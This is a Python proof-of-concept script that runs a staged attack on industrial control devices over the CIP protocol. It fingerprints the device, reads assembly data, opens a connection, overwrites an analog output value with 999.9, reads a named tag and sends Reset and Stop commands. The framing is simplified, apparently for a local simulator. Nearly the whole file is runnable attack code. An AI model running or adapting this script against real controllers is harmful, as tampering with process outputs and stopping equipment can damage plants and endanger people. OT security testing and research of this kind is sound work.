"""
CIP Advanced Attack PoC — 多阶段 OT 协议攻击演示:
  Stage 1: GetAttributeAll on Identity  — 设备指纹采集
  Stage 2: GetAttributeSingle on Assembly — 读取装配数据
  Stage 3: ForwardOpen connection with custom RPI
  Stage 4: SetAttributeSingle on AnalogOutputPoint — 模拟参数修改
  Stage 5: Read parameters via symbolic segment — 符号段路径遍历
  Stage 6: Send Reset/Stop with response capture
  Stage 7: ForwardClose & state verification

Usage:
  python advanced_attack.py <host> [port]

Defaults: host=127.0.0.1, port=44819
"""

import socket
import struct
import sys
import time
import argparse


def build_cip_packet(service, path_segments, payload=b"", mode="unconnected",
                     conn_id=0, seq_num=0):
    """Build a CIP packet with optional connection/UCMM header."""
    path = b"".join(path_segments)
    path_len = len(path) // 2
    inner = struct.pack("<BB", service, path_len) + path + payload

    if mode == "connected":
        header = struct.pack("<BBHH", 0xFF, 0xFE, conn_id, seq_num)
    elif mode == "ucmm":
        tick = int(time.time() * 1000) & 0xFFFF
        header = struct.pack("<BBHH", 0xFF, 0xFD, tick, 10000)
    else:
        return inner

    return header + inner


def parse_response(data):
    """Parse a CIP response, returning dict of fields."""
    result = {"raw": data.hex()}
    offset = 0

    if len(data) >= 2 and data[0] == 0xFF:
        if data[1] == 0xFE and len(data) >= 6:
            result["mode"] = "connected"
            result["conn_id"] = struct.unpack_from("<H", data, 2)[0]
            result["seq_num"] = struct.unpack_from("<H", data, 4)[0]
            offset = 6
        elif data[1] == 0xFD and len(data) >= 6:
            result["mode"] = "ucmm"
            result["tick_time"] = struct.unpack_from("<H", data, 2)[0]
            result["timeout"] = struct.unpack_from("<H", data, 4)[0]
            offset = 6

    if len(data) > offset:
        svc_raw = data[offset]
        result["service_code_raw"] = svc_raw
        is_resp = bool(svc_raw & 0x80)
        result["is_response"] = is_resp
        result["service_code"] = svc_raw & 0x7F

        if is_resp and len(data) > offset + 4:
            result["general_status"] = struct.unpack_from("<H", data, offset + 2)[0]
            result["success"] = (result["general_status"] == 0)

        result["payload"] = data[offset + 4:].hex() if len(data) > offset + 4 else ""

    return result


def make_logical_seg_class_16(class_id):
    """0x21 格式: 16-bit class ID"""
    return struct.pack("<BH", 0x21, class_id)

def make_logical_seg_inst_16(instance_id):
    """0x25 格式: 16-bit instance ID"""
    return struct.pack("<BH", 0x25, instance_id)

def make_logical_seg_attr_16(attr_id):
    """0x31 格式: 16-bit attribute ID"""
    return struct.pack("<BH", 0x31, attr_id)

def make_simple_path(class_id, instance_id=1, attr_id=None):
    """Legacy simple path: 2-byte words"""
    parts = []
    parts.append(struct.pack("<H", class_id))
    parts.append(struct.pack("<H", instance_id))
    if attr_id is not None:
        parts.append(struct.pack("<H", attr_id))
    return parts


def do_request(sock, packet, timeout=3.0):
    """Send packet and receive response."""
    sock.settimeout(timeout)
    sock.sendall(packet)
    try:
        resp = sock.recv(8192)
        return resp
    except socket.timeout:
        return None


def print_result(stage, result):
    print(f"\n{'='*60}")
    print(f"  [Stage {stage}]")
    for k, v in result.items():
        print(f"    {k}: {v}")
    print(f"{'='*60}")


def run_attack(host, port):
    print(f"[*] Starting CIP Advanced Attack against {host}:{port}")

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    print(f"[+] Connected to {host}:{port}")

    conn_o_t_id = 0
    conn_t_o_id = 0

    # ────────────────────────────────
    #  Stage 1: Fingerprint — GetAttributeAll on Identity(1)
    # ────────────────────────────────
    print("\n── Stage 1: Device Fingerprinting")
    pkt = build_cip_packet(0x01, make_simple_path(1, 1))
    resp = do_request(sock, pkt)
    result = parse_response(resp) if resp else {"error": "timeout"}

    if result.get("success"):
        payload = resp[4:] if len(resp) > 4 else b""
        vendor_end = payload.find(b"\x00")
        if vendor_end > 0:
            vendor = payload[:vendor_end].decode("ascii", errors="replace")
            result["vendor"] = vendor
            rest = payload[vendor_end + 1:]
            prod_end = rest.find(b"\x00")
            if prod_end > 0:
                result["product_name"] = rest[:prod_end].decode("ascii", errors="replace")
                rev = rest[prod_end + 1:]
                rev_end = rev.find(b"\x00")
                if rev_end > 0:
                    result["revision"] = rev[:rev_end].decode("ascii", errors="replace")
    print_result(1, result)

    # ────────────────────────────────
    #  Stage 2: Read Assembly Data — GetAttributeSingle on Assembly(4) attr=3
    # ────────────────────────────────
    print("\n── Stage 2: Read Assembly Data")
    pkt = build_cip_packet(0x0E, make_simple_path(4, 1, 3))
    resp = do_request(sock, pkt)
    result = parse_response(resp) if resp else {"error": "timeout"}
    if result.get("success"):
        payload = resp[4:] if len(resp) > 4 else b""
        result["assembly_data_len"] = len(payload)
        result["assembly_data_hex"] = payload[:32].hex()
    print_result(2, result)

    # ────────────────────────────────
    #  Stage 3: ForwardOpen — establish connection with custom RPI
    # ────────────────────────────────
    print("\n── Stage 3: ForwardOpen Connection")
    rpi_value = 5000
    fwd_payload = struct.pack("<I", rpi_value) + struct.pack("<I", rpi_value)
    pkt = build_cip_packet(0x4E, make_simple_path(6, 1), payload=fwd_payload)
    resp = do_request(sock, pkt)
    result = parse_response(resp) if resp else {"error": "timeout"}

    if result.get("success") and len(resp) >= 26:
        result["o_t_connection_id"] = struct.unpack_from("<I", resp, 4)[0]
        result["t_o_connection_id"] = struct.unpack_from("<I", resp, 8)[0]
        result["o_t_rpi"] = struct.unpack_from("<I", resp, 12)[0]
        result["t_o_rpi"] = struct.unpack_from("<I", resp, 16)[0]
        conn_o_t_id = result["o_t_connection_id"]
        conn_t_o_id = result["t_o_connection_id"]
    print_result(3, result)

    # ────────────────────────────────
    #  Stage 4: SetAttributeSingle on AnalogOutputPoint(11) — parameter tampering
    # ────────────────────────────────
    print("\n── Stage 4: Tamper Analog Output")
    fake_value = struct.pack("<f", 999.9)
    pkt = build_cip_packet(0x10, make_simple_path(11, 1, 3), payload=fake_value)
    resp = do_request(sock, pkt)
    result = parse_response(resp) if resp else {"error": "timeout"}
    if result.get("success"):
        result["injected_value"] = "999.9 (float)"
    print_result(4, result)

    # ────────────────────────────────
    #  Stage 5: Read Parameters via Symbolic Segment
    # ────────────────────────────────
    print("\n── Stage 5: Symbolic Segment Read")
    symbol = "LoopGain"
    sym_seg = bytes([0x71, len(symbol)]) + symbol.encode("ascii")
    if len(sym_seg) % 2 != 0:
        sym_seg += b"\x00"
    pkt = build_cip_packet(0x0E, [sym_seg], payload=b"")
    resp = do_request(sock, pkt)
    result = parse_response(resp) if resp else {"error": "timeout"}
    if result.get("success"):
        payload = resp[4:] if len(resp) > 4 else b""
        if len(payload) >= 4:
            val = struct.unpack_from("<f", payload, 0)[0]
            result["param_value"] = round(val, 4)
    print_result(5, result)

    # ────────────────────────────────
    #  Stage 6: Reset/Stop — send and capture response
    # ────────────────────────────────
    print("\n── Stage 6: Send Reset")
    pkt_reset = build_cip_packet(0x52, make_simple_path(4, 1))
    resp_reset = do_request(sock, pkt_reset)
    result_reset = parse_response(resp_reset) if resp_reset else {"error": "timeout"}
    print_result("6a (Reset)", result_reset)

    print("\n── Stage 6b: Send Stop")
    pkt_stop = build_cip_packet(0x54, make_simple_path(6, 1))
    resp_stop = do_request(sock, pkt_stop)
    result_stop = parse_response(resp_stop) if resp_stop else {"error": "timeout"}
    print_result("6b (Stop)", result_stop)

    # ────────────────────────────────
    #  Stage 7: ForwardClose & State Verification
    # ────────────────────────────────
    print("\n── Stage 7: Close Connection & Verify")
    if conn_o_t_id:
        close_payload = struct.pack("<H", conn_o_t_id)
        pkt = build_cip_packet(0x4F, make_simple_path(6, 1), payload=close_payload)
        resp = do_request(sock, pkt)
        result = parse_response(resp) if resp else {"error": "timeout"}
        result["closed_conn_id"] = conn_o_t_id
        print_result("7a (ForwardClose)", result)
    else:
        print("  [!] No active connection to close")

    # Verify device state via Identity read
    print("\n  [Stage 7b: Verify State]")
    pkt = build_cip_packet(0x0E, make_simple_path(1, 1, 8))
    resp = do_request(sock, pkt)
    result = parse_response(resp) if resp else {"error": "timeout"}
    if result.get("success"):
        payload = resp[4:] if len(resp) > 4 else b""
        if len(payload) >= 2:
            state_val = struct.unpack_from("<H", payload, 0)[0]
            result["device_state"] = f"0x{state_val:04X}"
            result["device_running"] = bool(state_val & 0x1000)
    print_result("7b (Verify)", result)

    sock.close()
    print("\n[*] Attack sequence complete.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CIP Advanced Attack PoC")
    parser.add_argument("host", nargs="?", default="127.0.0.1", help="Target host")
    parser.add_argument("port", nargs="?", type=int, default=44819, help="Target port")
    args = parser.parse_args()

    run_attack(args.host, args.port)
